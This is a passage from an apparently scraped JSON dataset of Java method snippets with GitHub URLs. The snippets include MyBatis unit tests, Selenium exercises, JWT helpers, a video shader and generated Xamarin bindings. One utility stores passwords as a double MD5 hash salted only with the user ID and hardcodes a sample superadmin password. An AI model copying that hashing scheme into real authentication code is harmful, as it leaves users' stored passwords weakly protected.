"params": ["String", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "  public static boolean authenticatePassword(String inputPassword, String userId, String dataPassword){    return dataPassword.equals(encodeByMD5(encodeByMD5(inputPassword) + userId));  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/utils/MD5Utils.java", "stars": "18", "class": {"name": "MD5Utils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "encodeByMD5", "params": ["String"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String encodeByMD5(String originString){    if(null != originString){      try {        MessageDigest messageDigest = MessageDigest.getInstance(\"MD5\");        byte[] results = messageDigest.digest(originString.getBytes(\"UTF-8\"));        String result = byteArrayToHexString(results);        return result;      } catch (Exception e) {        e.printStackTrace();      }    }    return null;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/utils/MD5Utils.java", "stars": "18", "class": {"name": "MD5Utils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "byteArrayToHexString", "params": ["byte"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String byteArrayToHexString(byte[] b){    StringBuilder resultSb = new StringBuilder();    for(int i=0; i<b.length; i++){      resultSb.append(byteToHexString(b[i]));    }    return resultSb.toString();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/utils/MD5Utils.java", "stars": "18", "class": {"name": "MD5Utils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "byteToHexString", "params": ["byte"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String byteToHexString(byte b){    int n = b;    if(n < 0){      n = 256+n;    }    int d1 = n/16;    int d2 = n%16;    return hexDigits[d1] + hexDigits[d2];  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/utils/MD5Utils.java", "stars": "18", "class": {"name": "MD5Utils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void main(String[] args) {    String userId = \"wtss_superadmin\";    String inputPwd = \"Abcd1234\";    String md5Pwd = md5(md5(inputPwd) + userId);    System.out.println(\"\u52a0\u5bc6\u540e\u7684\u5bc6\u7801: \" + md5Pwd);    boolean pwdAuth = authenticatePassword(inputPwd, userId, md5Pwd);    System.out.println(pwdAuth);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/utils/MD5Utils.java", "stars": "18", "class": {"name": "MD5Utils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUp", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void setUp() {    resultExtractor = new ResultExtractor(configuration, objectFactory);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/ResultExtractorTest.java", "stars": "15", "class": {"name": "ResultExtractorTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldExtractNullForNullTargetType", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldExtractNullForNullTargetType() {    final Object result = resultExtractor.extractObjectFromList(null, null);    assertThat(result).isNull();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/ResultExtractorTest.java", "stars": "15", "class": {"name": "ResultExtractorTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldExtractList", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldExtractList() {    final List<Object> list = Arrays.asList(1, 2, 3);    final Object result = resultExtractor.extractObjectFromList(list, List.class);    assertThat(result).isInstanceOf(List.class);    final List resultList = (List) result;    assertThat(resultList).isEqualTo(list);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/ResultExtractorTest.java", "stars": "15", "class": {"name": "ResultExtractorTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldExtractArray", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldExtractArray() {    final List<Object> list = Arrays.asList(1, 2, 3);    final Object result = resultExtractor.extractObjectFromList(list, Integer[].class);    assertThat(result).isInstanceOf(Integer[].class);    final Integer[] resultArray = (Integer[]) result;    assertThat(resultArray).isEqualTo(new Integer[]{1, 2, 3});  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/ResultExtractorTest.java", "stars": "15", "class": {"name": "ResultExtractorTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldExtractSet", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldExtractSet() {    final List<Object> list = Arrays.asList(1, 2, 3);    final Class<Set> targetType = Set.class;    final Set set = new HashSet();    final MetaObject metaObject = mock(MetaObject.class);    when(objectFactory.isCollection(targetType)).thenReturn(true);    when(objectFactory.create(targetType)).thenReturn(set);    when(configuration.newMetaObject(set)).thenReturn(metaObject);    final Set result = (Set) resultExtractor.extractObjectFromList(list, targetType);    assertThat(result).isSameAs(set);    verify(metaObject).addAll(list);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/ResultExtractorTest.java", "stars": "15", "class": {"name": "ResultExtractorTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldExtractSingleObject", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldExtractSingleObject() {    final List<Object> list = Collections.singletonList(\"single object\");    assertThat((String) resultExtractor.extractObjectFromList(list, String.class)).isEqualTo(\"single object\");    assertThat((String) resultExtractor.extractObjectFromList(list, null)).isEqualTo(\"single object\");    assertThat((String) resultExtractor.extractObjectFromList(list, Integer.class)).isEqualTo(\"single object\");  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/ResultExtractorTest.java", "stars": "15", "class": {"name": "ResultExtractorTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldFailWhenMutipleItemsInList", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldFailWhenMutipleItemsInList() {    final List<Object> list = Arrays.asList(\"first object\", \"second object\");    Assertions.assertThrows(ExecutorException.class, () -> resultExtractor.extractObjectFromList(list, String.class));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/ResultExtractorTest.java", "stars": "15", "class": {"name": "ResultExtractorTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "setUpMethod", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUpMethod(){        driver = WebDriverFactory.getDriver(\"chrome\");        driver.manage().window().maximize();        driver.get(\"http://omayo.blogspot.com/\");    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Study2.java", "stars": "2", "class": {"name": "Study2", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "afterMethod", "params": [], "throws": ["InterruptedException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void afterMethod() throws InterruptedException {        Thread.sleep(4000);        //driver.quit();    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Study2.java", "stars": "2", "class": {"name": "Study2", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "test1", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test1(){        WebElement multiselect1 = driver.findElement(By.id(\"multiselect1\"));        Select select1 = new Select(multiselect1);        List<WebElement> options = select1.getOptions();        for (WebElement option : options) {            System.out.println(option.getText());        }    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Study2.java", "stars": "2", "class": {"name": "Study2", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "test2", "params": [], "throws": ["InterruptedException", "AWTException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void test2() throws InterruptedException, AWTException {        WebElement dropdownElement = driver.findElement(By.cssSelector(\".dropbtn\"));        dropdownElement.click();       Actions action = new Actions(driver);       // action.click(dropdownElement).perform();        List<WebElement> elements = driver.findElements(By.cssSelector(\"#myDropdown>a\"));        WebDriverWait wait = new WebDriverWait(driver, 10);        wait.until(ExpectedConditions.visibilityOfAllElements(elements));        /*        for (WebElement element : elements) {            System.out.println(element.getText());        }        */        for(int i=0; i<elements.size(); i++){            String s = Keys.chord(Keys.CONTROL, Keys.ENTER);// control+click--->            elements.get(i).sendKeys(s); //-->            Thread.sleep(2000);            dropdownElement.click();            wait.until(ExpectedConditions.visibilityOfAllElements(elements));        }        Set<String> handles = driver.getWindowHandles();        Iterator<String> ite = handles.iterator();        while(ite.hasNext()){            driver.switchTo().window(ite.next());            Thread.sleep(2000);            String title = driver.getTitle();            if(title.contains(\"Facebook\")){                break;            }        }        driver.findElement(By.cssSelector(\"#email\")).sendKeys(\"group study success\");        }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Study2.java", "stars": "2", "class": {"name": "Study2", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "generateToken", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String generateToken(Map<String, Object> claims) {        Date expirationDate = new Date(System.currentTimeMillis() + expiration);        return Jwts.builder().setClaims(claims).setExpiration(expirationDate).signWith(SignatureAlgorithm.HS512, secret).compact();    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/JwtTokenUtils.java", "stars": "1", "class": {"name": "JwtTokenUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getClaimsFromToken", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "Claims", "snippet": "    private Claims getClaimsFromToken(String token) {        Claims claims;        claims = Jwts.parser().setSigningKey(secret).parseClaimsJws(token).getBody();        return claims;    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/JwtTokenUtils.java", "stars": "1", "class": {"name": "JwtTokenUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "generateToken", "params": ["UserDetails"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String generateToken(UserDetails userDetails) {        Map<String, Object> claims = new HashMap<>(2);        claims.put(Claims.SUBJECT, userDetails.getUsername());        claims.put(Claims.ISSUED_AT, new Date());        return generateToken(claims);    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/JwtTokenUtils.java", "stars": "1", "class": {"name": "JwtTokenUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getUsernameFromToken", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUsernameFromToken(String token) {        String username = \"\";        try {            Claims claims = getClaimsFromToken(token);            username = claims.getSubject();        } catch (Exception e) {            username = null;        }        return username;    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/JwtTokenUtils.java", "stars": "1", "class": {"name": "JwtTokenUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isTokenExpired", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "    public Boolean isTokenExpired(String token) {        try {            Claims claims = getClaimsFromToken(token);            Date expiration = claims.getExpiration();            return expiration.before(new Date());        } catch (Exception e) {            return true;        }    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/JwtTokenUtils.java", "stars": "1", "class": {"name": "JwtTokenUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "refreshToken", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String refreshToken(String token) {        String refreshedToken;        try {            Claims claims = getClaimsFromToken(token);            claims.put(Claims.ISSUED_AT, new Date());            refreshedToken = generateToken(claims);        } catch (Exception e) {            refreshedToken = null;        }        return refreshedToken;    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/JwtTokenUtils.java", "stars": "1", "class": {"name": "JwtTokenUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "validateToken", "params": ["String", "UserDetails"], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "    public Boolean validateToken(String token, UserDetails userDetails) {        SdkUser user = (SdkUser) userDetails;        String username = getUsernameFromToken(token);        return (username.equals(user.getUsername()) && !isTokenExpired(token));    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/JwtTokenUtils.java", "stars": "1", "class": {"name": "JwtTokenUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getShader", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {        String shader = \"#extension GL_OES_EGL_image_external : require\\n\"                + \"precision mediump float;\\n\"                + \"varying vec2 vTextureCoord;\\n\"                + \"uniform samplerExternalOES sTexture;\\n\" + \"void main() {\\n\"                + \"  vec4 color = texture2D(sTexture, vTextureCoord);\\n\"                + \"  float colorR = (1.0 - color.r) / 1.0;\\n\"                + \"  float colorG = (1.0 - color.g) / 1.0;\\n\"                + \"  float colorB = (1.0 - color.b) / 1.0;\\n\"                + \"  gl_FragColor = vec4(colorR, colorG, colorB, color.a);\\n\"                + \"}\\n\";        return shader;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/InvertColorsEffect.java", "stars": "2", "class": {"name": "InvertColorsEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "onQueryTextChange", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onQueryTextChange (java.lang.String p0)\t{\t\treturn n_onQueryTextChange (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnQueryTextListenerImplementor.java", "stars": "2", "class": {"name": "SearchView_OnQueryTextListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onQueryTextChange", "params": ["java"], "throws": null, "modifiers": ["native", "private"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onQueryTextChange (java.lang.String p0);\tpublic boolean onQueryTextSubmit (java.lang.String p0)\t{\t\treturn n_onQueryTextSubmit (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnQueryTextListenerImplementor.java", "stars": "2", "class": {"name": "SearchView_OnQueryTextListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "onQueryTextSubmit", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onQueryTextSubmit (java.lang.String p0)\t{\t\treturn n_onQueryTextSubmit (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnQueryTextListenerImplementor.java", "stars": "2", "class": {"name": "SearchView_OnQueryTextListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onQueryTextSubmit", "params": ["java"], "throws": null, "modifiers": ["native", "private"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onQueryTextSubmit (java.lang.String p0);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnQueryTextListenerImplementor.java", "stars": "2", "class": {"name": "SearchView_OnQueryTextListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnQueryTextListenerImplementor.java", "stars": "2", "class": {"name": "SearchView_OnQueryTextListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnQueryTextListenerImplementor.java", "stars": "2", "class": {"name": "SearchView_OnQueryTextListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "testReturn_Lv0SimpleClass", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_Lv0SimpleClass() throws Exception {    Class<?> clazz = Level0Mapper.class;    Method method = clazz.getMethod(\"simpleSelect\");    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertEquals(Double.class, result);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_SimpleVoid", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_SimpleVoid() throws Exception {    Class<?> clazz = Level1Mapper.class;    Method method = clazz.getMethod(\"simpleSelectVoid\", Integer.class);    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertEquals(void.class, result);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_SimplePrimitive", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_SimplePrimitive() throws Exception {    Class<?> clazz = Level1Mapper.class;    Method method = clazz.getMethod(\"simpleSelectPrimitive\", int.class);    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertEquals(double.class, result);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_SimpleClass", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_SimpleClass() throws Exception {    Class<?> clazz = Level1Mapper.class;    Method method = clazz.getMethod(\"simpleSelect\");    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertEquals(Double.class, result);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_SimpleList", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_SimpleList() throws Exception {    Class<?> clazz = Level1Mapper.class;    Method method = clazz.getMethod(\"simpleSelectList\");    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertTrue(result instanceof ParameterizedType);    ParameterizedType paramType = (ParameterizedType) result;    assertEquals(List.class, paramType.getRawType());    assertEquals(1, paramType.getActualTypeArguments().length);    assertEquals(Double.class, paramType.getActualTypeArguments()[0]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_SimpleMap", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_SimpleMap() throws Exception {    Class<?> clazz = Level1Mapper.class;    Method method = clazz.getMethod(\"simpleSelectMap\");    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertTrue(result instanceof ParameterizedType);    ParameterizedType paramType = (ParameterizedType) result;    assertEquals(Map.class, paramType.getRawType());    assertEquals(2, paramType.getActualTypeArguments().length);    assertEquals(Integer.class, paramType.getActualTypeArguments()[0]);    assertEquals(Double.class, paramType.getActualTypeArguments()[1]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_SimpleWildcard", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_SimpleWildcard() throws Exception {    Class<?> clazz = Level1Mapper.class;    Method method = clazz.getMethod(\"simpleSelectWildcard\");    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertTrue(result instanceof ParameterizedType);    ParameterizedType paramType = (ParameterizedType) result;    assertEquals(List.class, paramType.getRawType());    assertEquals(1, paramType.getActualTypeArguments().length);    assertTrue(paramType.getActualTypeArguments()[0] instanceof WildcardType);    WildcardType wildcard = (WildcardType) paramType.getActualTypeArguments()[0];    assertEquals(String.class, wildcard.getUpperBounds()[0]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_SimpleArray", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_SimpleArray() throws Exception {    Class<?> clazz = Level1Mapper.class;    Method method = clazz.getMethod(\"simpleSelectArray\");    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertTrue(result instanceof Class);    Class<?> resultClass = (Class<?>) result;    assertTrue(resultClass.isArray());    assertEquals(String.class, resultClass.getComponentType());  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_SimpleArrayOfArray", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_SimpleArrayOfArray() throws Exception {    Class<?> clazz = Level1Mapper.class;    Method method = clazz.getMethod(\"simpleSelectArrayOfArray\");    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertTrue(result instanceof Class);    Class<?> resultClass = (Class<?>) result;    assertTrue(resultClass.isArray());    assertTrue(resultClass.getComponentType().isArray());    assertEquals(String.class, resultClass.getComponentType().getComponentType());  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_SimpleTypeVar", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_SimpleTypeVar() throws Exception {    Class<?> clazz = Level1Mapper.class;    Method method = clazz.getMethod(\"simpleSelectTypeVar\");    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertTrue(result instanceof ParameterizedType);    ParameterizedType paramType = (ParameterizedType) result;    assertEquals(Calculator.class, paramType.getRawType());    assertEquals(1, paramType.getActualTypeArguments().length);    assertTrue(paramType.getActualTypeArguments()[0] instanceof WildcardType);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_Lv1Class", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_Lv1Class() throws Exception {    Class<?> clazz = Level1Mapper.class;    Method method = clazz.getMethod(\"select\", Object.class);    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertEquals(String.class, result);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_Lv2CustomClass", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_Lv2CustomClass() throws Exception {    Class<?> clazz = Level2Mapper.class;    Method method = clazz.getMethod(\"selectCalculator\", Calculator.class);    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertTrue(result instanceof ParameterizedType);    ParameterizedType paramType = (ParameterizedType) result;    assertEquals(Calculator.class, paramType.getRawType());    assertEquals(1, paramType.getActualTypeArguments().length);    assertEquals(String.class, paramType.getActualTypeArguments()[0]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_Lv2CustomClassList", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_Lv2CustomClassList() throws Exception {    Class<?> clazz = Level2Mapper.class;    Method method = clazz.getMethod(\"selectCalculatorList\");    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertTrue(result instanceof ParameterizedType);    ParameterizedType paramTypeOuter = (ParameterizedType) result;    assertEquals(List.class, paramTypeOuter.getRawType());    assertEquals(1, paramTypeOuter.getActualTypeArguments().length);    ParameterizedType paramTypeInner = (ParameterizedType) paramTypeOuter.getActualTypeArguments()[0];    assertEquals(Calculator.class, paramTypeInner.getRawType());    assertEquals(Date.class, paramTypeInner.getActualTypeArguments()[0]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_Lv0InnerClass", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_Lv0InnerClass() throws Exception {    Class<?> clazz = Level0InnerMapper.class;    Method method = clazz.getMethod(\"select\", Object.class);    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertEquals(Float.class, result);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_Lv2Class", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_Lv2Class() throws Exception {    Class<?> clazz = Level2Mapper.class;    Method method = clazz.getMethod(\"select\", Object.class);    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertEquals(String.class, result);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_Lv1List", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_Lv1List() throws Exception {    Class<?> clazz = Level1Mapper.class;    Method method = clazz.getMethod(\"selectList\", Object.class, Object.class);    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertTrue(result instanceof ParameterizedType);    ParameterizedType type = (ParameterizedType) result;    assertEquals(List.class, type.getRawType());    assertEquals(1, type.getActualTypeArguments().length);    assertEquals(String.class, type.getActualTypeArguments()[0]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_Lv1Array", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_Lv1Array() throws Exception {    Class<?> clazz = Level1Mapper.class;    Method method = clazz.getMethod(\"selectArray\", List[].class);    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertTrue(result instanceof Class);    Class<?> resultClass = (Class<?>) 